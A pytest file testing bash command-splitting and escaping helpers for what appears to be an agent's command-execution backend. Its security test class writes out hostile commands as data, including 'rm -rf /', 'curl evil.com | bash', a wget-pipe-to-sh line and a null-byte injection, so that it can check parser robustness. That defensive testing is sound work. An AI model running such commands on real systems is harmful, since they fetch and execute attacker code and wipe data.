"""Comprehensive tests for backend.execution.utils.bash - Bash command parsing and execution."""

from unittest.mock import patch

from backend.execution.utils.bash import (
    escape_bash_special_chars,
    split_bash_commands,
)


class TestSplitBashCommands:
    """Tests for split_bash_commands() function."""

    def test_empty_string_returns_empty_command(self):
        """Test empty string returns list with empty string."""
        result = split_bash_commands('')
        assert result == ['']

    def test_whitespace_only_returns_empty_command(self):
        """Test whitespace-only string returns list with empty string."""
        result = split_bash_commands('   \n\t  ')
        assert result == ['']

    def test_single_simple_command(self):
        """Test single simple command."""
        result = split_bash_commands('echo hello')
        assert result == ['echo hello']

    def test_multiple_commands_semicolon_separated(self):
        """Test multiple commands separated by semicolons."""
        result = split_bash_commands('echo a; echo b; echo c')
        # Compound commands are kept as one by bashlex
        assert result
        assert 'echo a' in result[0]
        assert 'echo b' in result[0]
        assert 'echo c' in result[0]

    def test_multiple_commands_newline_separated(self):
        """Test multiple commands separated by newlines."""
        result = split_bash_commands('echo a\necho b\necho c')
        assert len(result) == 3

    def test_pipeline_command(self):
        """Test pipeline commands stay together."""
        result = split_bash_commands('ls -la | grep test')
        assert len(result) == 1
        assert '|' in result[0]

    def test_command_with_redirection(self):
        """Test command with output redirection."""
        result = split_bash_commands('echo hello > output.txt')
        assert len(result) == 1
        assert '>' in result[0]

    def test_command_with_background_execution(self):
        """Test command with background execution (&)."""
        result = split_bash_commands('sleep 10 &')
        assert len(result) == 1
        assert '&' in result[0]

    def test_command_with_logical_and(self):
        """Test command with logical AND (&&)."""
        result = split_bash_commands('mkdir test && cd test')
        assert len(result) == 1
        assert '&&' in result[0]

    def test_command_with_logical_or(self):
        """Test command with logical OR (||)."""
        result = split_bash_commands('test -f file.txt || touch file.txt')
        assert len(result) == 1
        assert '||' in result[0]

    def test_command_with_quoted_strings(self):
        """Test command with quoted strings containing special chars."""
        result = split_bash_commands('echo "hello; world"')
        assert len(result) == 1
        assert '"' in result[0]

    def test_command_with_single_quotes(self):
        """Test command with single-quoted strings."""
        result = split_bash_commands("echo 'test; value'")
        assert len(result) == 1

    def test_command_with_escaped_semicolon(self):
        """Test command with escaped semicolon."""
        result = split_bash_commands(r'echo test\; value')
        # Should not split on escaped semicolon
        assert len(result) == 1

    def test_command_with_subshell(self):
        """Test command with subshell execution."""
        result = split_bash_commands('result=$(echo hello)')
        assert len(result) == 1
        assert '$(' in result[0]

    def test_command_with_backticks(self):
        """Test command with backtick substitution."""
        result = split_bash_commands('result=`date`')
        assert len(result) == 1

    def test_for_loop_command(self):
        """Test for loop command."""
        cmd = 'for i in 1 2 3; do echo $i; done'
        result = split_bash_commands(cmd)
        assert len(result) == 1

    def test_if_statement(self):
        """Test if statement."""
        cmd = 'if [ -f file.txt ]; then echo exists; fi'
        result = split_bash_commands(cmd)
        assert len(result) == 1

    def test_function_definition(self):
        """Test function definition."""
        cmd = 'myfunc() { echo hello; }'
        result = split_bash_commands(cmd)
        # Function definition should be kept as one command
        assert len(result) == 1

    def test_heredoc_command(self):
        """Test heredoc command."""
        cmd = """cat <<EOF
line 1
line 2
EOF"""
        result = split_bash_commands(cmd)
        assert len(result) == 1

    def test_complex_command_chain(self):
        """Test complex command chain with multiple operators."""
        cmd = 'cd /tmp && mkdir test || echo failed; ls -la'
        result = split_bash_commands(cmd)
        # bashlex returns compound statements as one command
        assert result
        assert 'cd /tmp' in result[0]

    def test_parsing_error_returns_original(self):
        """Test that parsing errors return original command."""
        # Invalid syntax that bashlex can't parse
        invalid_cmd = 'echo $((]'
        result = split_bash_commands(invalid_cmd)
        assert result == [invalid_cmd]

    def test_parsing_error_not_implemented_returns_original(self):
        """Test NotImplementedError in parsing returns original."""
        cmd = 'some command'
        with patch('bashlex.parse', side_effect=NotImplementedError):
            result = split_bash_commands(cmd)
            assert result == [cmd]

    def test_parsing_error_type_error_returns_original(self):
        """Test TypeError in parsing returns original."""
        cmd = 'some command'
        with patch('bashlex.parse', side_effect=TypeError):
            result = split_bash_commands(cmd)
            assert result == [cmd]

    def test_parsing_error_attribute_error_returns_original(self):
        """Test AttributeError in parsing returns original."""
        cmd = 'some command'
        with patch('bashlex.parse', side_effect=AttributeError):
            result = split_bash_commands(cmd)
            assert result == [cmd]

    def test_command_with_trailing_whitespace(self):
        """Test command with trailing whitespace is stripped."""
        result = split_bash_commands('echo hello   \n')
        assert len(result) == 1
        # Trailing whitespace should be stripped
        assert not result[0].endswith('   ')

    def test_multiple_commands_with_spacing(self):
        """Test multiple commands with various spacing."""
        result = split_bash_commands('echo a  ;  echo b  ;  echo c')
        # Compound commands stay together
        assert result

    def test_command_with_environment_variable(self):
        """Test command with environment variable."""
        result = split_bash_commands('export PATH=/usr/bin:$PATH')
        assert len(result) == 1
        assert '$PATH' in result[0]

    def test_empty_commands_between_semicolons(self):
        """Test handling of empty commands between semicolons."""
        result = split_bash_commands('echo a;;echo b')
        # bashlex should handle double semicolons
        assert 'echo a' in str(result)
        assert 'echo b' in str(result)

    def test_command_with_case_statement(self):
        """Test case statement."""
        cmd = """case $1 in
  start) echo starting ;;
  stop) echo stopping ;;
esac"""
        result = split_bash_commands(cmd)
        assert len(result) == 1

    def test_multiline_command_preservation(self):
        """Test that multiline commands are properly preserved."""
        cmd = """echo "line 1" \\
echo "line 2" \\
echo "line 3" """
        result = split_bash_commands(cmd)
        # Should preserve line continuations
        assert result


class TestEscapeBashSpecialChars:
    """Tests for escape_bash_special_chars() function."""

    def test_empty_string_returns_empty(self):
        """Test empty string returns empty."""
        result = escape_bash_special_chars('')
        assert result == ''

    def test_whitespace_only_returns_empty(self):
        """Test whitespace-only string returns empty."""
        result = escape_bash_special_chars('   \n\t  ')
        assert result == ''

    def test_simple_command_unchanged(self):
        """Test simple command without special chars is unchanged."""
        cmd = 'echo hello'
        result = escape_bash_special_chars(cmd)
        assert 'echo' in result
        assert 'hello' in result

    def test_escaped_semicolon_double_escaped(self):
        """Test that \\; becomes \\\\;."""
        cmd = r'echo test\; value'
        result = escape_bash_special_chars(cmd)
        # Should double-escape the backslash before semicolon
        assert r'\\' in result

    def test_escaped_pipe_double_escaped(self):
        """Test that \\| becomes \\\\|."""
        cmd = r'echo test\| value'
        result = escape_bash_special_chars(cmd)
        assert r'\\' in result

    def test_escaped_ampersand_double_escaped(self):
        """Test that \\& becomes \\\\&."""
        cmd = r'echo test\& value'
        result = escape_bash_special_chars(cmd)
        assert r'\\' in result

    def test_escaped_redirect_double_escaped(self):
        """Test that \\> and \\< become \\\\> and \\\\<."""
        cmd = r'echo test\> file'
        result = escape_bash_special_chars(cmd)
        assert r'\\' in result

    def test_normal_pipe_unchanged(self):
        """Test normal pipe (not escaped) remains unchanged."""
        cmd = 'ls | grep test'
        result = escape_bash_special_chars(cmd)
        assert '|' in result
        # Should not have double backslash before unescaped pipe
        assert r'\|' not in result or r'\\|' not in result

    def test_normal_semicolon_unchanged(self):
        """Test normal semicolon remains unchanged."""
        cmd = 'echo a; echo b'
        result = escape_bash_special_chars(cmd)
        assert ';' in result

    def test_double_quoted_string_preserved(self):
        """Test double-quoted strings are preserved."""
        cmd = 'echo "hello; world"'
        result = escape_bash_special_chars(cmd)
        assert '"hello; world"' in result or '"hello' in result

    def test_single_quoted_string_preserved(self):
        """Test single-quoted strings are preserved."""
        cmd = "echo 'hello; world'"
        result = escape_bash_special_chars(cmd)
        assert "'hello" in result or "'hello; world'" in result

    def test_command_substitution_preserved(self):
        """Test command substitution $() is preserved."""
        cmd = 'result=$(echo test)'
        result = escape_bash_special_chars(cmd)
        assert '$(' in result
        assert ')' in result

    def test_backtick_substitution_preserved(self):
        """Test backtick substitution is preserved."""
        cmd = 'result=`date`'
        result = escape_bash_special_chars(cmd)
        assert '`' in result

    def test_heredoc_preserved(self):
        """Test heredoc content is preserved."""
        cmd = """cat <<EOF
test; data
EOF"""
        result = escape_bash_special_chars(cmd)
        assert 'EOF' in result

    def test_parsing_error_returns_original(self):
        """Test parsing error returns original command."""
        invalid_cmd = 'echo $((]'
        result = escape_bash_special_chars(invalid_cmd)
        # Should return original on parse error
        assert result == invalid_cmd

    def test_multiple_escaped_chars_in_sequence(self):
        """Test multiple escaped special chars."""
        cmd = r'echo \; \| \& \>'
        result = escape_bash_special_chars(cmd)
        # All should be double-escaped
        assert r'\\' in result

    def test_mixed_escaped_and_normal_chars(self):
        """Test mix of escaped and normal special chars."""
        cmd = r'echo a\; b | grep c'
        result = escape_bash_special_chars(cmd)
        # Escaped semicolon should be double-escaped
        # Normal pipe should remain
        assert r'\\' in result or r'\;' in result
        assert '|' in result

    def test_escaped_chars_in_word(self):
        """Test escaped chars within a word token."""
        cmd = r'filename_with\;semicolon'
        result = escape_bash_special_chars(cmd)
        # Should double-escape
        assert r'\\' in result or result == cmd

    def test_command_with_redirect_and_escaped_char(self):
        """Test command with both redirect and escaped char."""
        cmd = r'echo test\; > output.txt'
        result = escape_bash_special_chars(cmd)
        assert 'output.txt' in result

    def test_multiple_commands_with_escapes(self):
        """Test multiple commands each with escaped chars."""
        cmd = r'echo a\;; echo b\|'
        result = escape_bash_special_chars(cmd)
        # Should preserve structure and escape properly
        assert 'echo' in result

    def test_unescaped_ampersand_unchanged(self):
        """Test normal & for background execution unchanged."""
        cmd = 'sleep 10 &'
        result = escape_bash_special_chars(cmd)
        assert '&' in result
        # Should not be escaped
        assert r'\&' not in result or r'\\&' not in result

    def test_redirect_operators_unchanged(self):
        """Test normal redirect operators unchanged."""
        cmd = 'echo hello > out.txt'
        result = escape_bash_special_chars(cmd)
        assert '>' in result
        assert 'out.txt' in result

    def test_escaped_chars_between_tokens(self):
        """Test escaped chars between tokens."""
        cmd = r'echo a \; echo b'
        result = escape_bash_special_chars(cmd)
        # Escaped semicolon between words should be double-escaped
        assert r'\\' in result or ';' in result

    def test_complex_command_with_multiple_features(self):
        """Test complex command with quotes, escapes, and operators."""
        cmd = r'echo "test\;" | grep "\|" && echo done'
        result = escape_bash_special_chars(cmd)
        # Should preserve quoted strings and handle escapes
        assert 'echo' in result
        assert 'grep' in result
        assert 'done' in result

    def test_heredoc_with_node_parts(self):
        """Test heredoc node with parts attribute."""
        cmd = r"""cat <<EOF
line with \; escaped
EOF"""
        result = escape_bash_special_chars(cmd)
        assert 'EOF' in result
        assert 'line with' in result


class TestBashCommandParsingSecurity:
    """Security-focused tests for bash command parsing."""

    def test_command_injection_attempt_preserved(self):
        """Test command injection patterns are properly handled."""
        # These should be parsed correctly, not introduce vulnerabilities
        dangerous_cmds = [
            'echo test; rm -rf /',
            'echo test && curl evil.com | bash',
            '$(curl evil.com | bash)',
            '`wget evil.com -O- | sh`',
        ]
        for cmd in dangerous_cmds:
            result = split_bash_commands(cmd)
            # Should not be empty or None
            assert result is not None
            assert result

    def test_escaped_injection_attempt_preserved(self):
        """Test escaped injection attempts are properly escaped."""
        dangerous_cmds = [
            r'echo \; rm -rf /',
            r'echo \| curl evil.com',
        ]
        for cmd in dangerous_cmds:
            result = escape_bash_special_chars(cmd)
            # Should preserve or double-escape
            assert result is not None
            assert result

    def test_null_byte_in_command(self):
        """Test handling of null bytes in commands."""
        # Null bytes can sometimes bypass security checks
        cmd = 'echo test\x00; rm -rf /'
        result = split_bash_commands(cmd)
        # Should handle gracefully
        assert result is not None

    def test_unicode_in_commands(self):
        """Test unicode characters in commands."""
        cmd = "echo 'hello 世界'"
        result = split_bash_commands(cmd)
        assert len(result) == 1
        assert 'echo' in result[0]

    def test_very_long_command(self):
        """Test handling of very long commands."""
        cmd = 'echo ' + 'a' * 10000
        result = split_bash_commands(cmd)
        assert len(result) == 1
        assert 'echo' in result[0]

    def test_deeply_nested_subshells(self):
        """Test deeply nested subshell commands."""
        cmd = 'echo $(echo $(echo $(echo test)))'
        result = split_bash_commands(cmd)
        assert len(result) == 1

    def test_malformed_quotes_handling(self):
        """Test handling of malformed quotes."""
        malformed = [
            'echo "unclosed',
            "echo 'unclosed",
            'echo "mixed\'',
        ]
        for cmd in malformed:
            # Should either parse or return original
            result = split_bash_commands(cmd)
            assert result is not None
            assert result
